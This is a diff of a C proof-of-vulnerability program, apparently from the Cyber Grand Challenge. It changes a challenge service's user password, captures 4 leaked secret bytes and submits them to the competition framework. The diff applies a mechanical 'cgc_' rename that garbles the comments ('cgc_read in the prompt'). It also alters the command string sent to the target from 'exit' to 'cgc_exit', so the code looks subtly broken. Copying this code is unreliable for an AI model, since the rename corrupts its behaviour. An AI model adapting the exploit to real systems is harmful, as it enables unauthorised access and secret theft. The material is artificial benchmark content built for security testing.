@@ -132,7 +132,7 @@ int main(void) {
 	// negotiate a Type2 POV with the Competition Framework
 	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);
 
-	// read in the prompt
+	// cgc_read in the prompt
 	ReadBytes(0, buf, 8);
 
 	// Change the crs user password
@@ -158,8 +158,8 @@ int main(void) {
 	ReadBytes(0, secret_buf, 4);		// 4 bytes from file
 	ReadBytes(0, buf, 9);			// new root@crs> prompt
 
-	// send exit to cleanly exit
-	SendString(1, "exit\n\r");
+	// send cgc_exit to cleanly cgc_exit
+	SendString(1, "cgc_exit\n\r");
 
 	// send the bytes to the competition framework
 	SendBytes(3, secret_buf, 4);
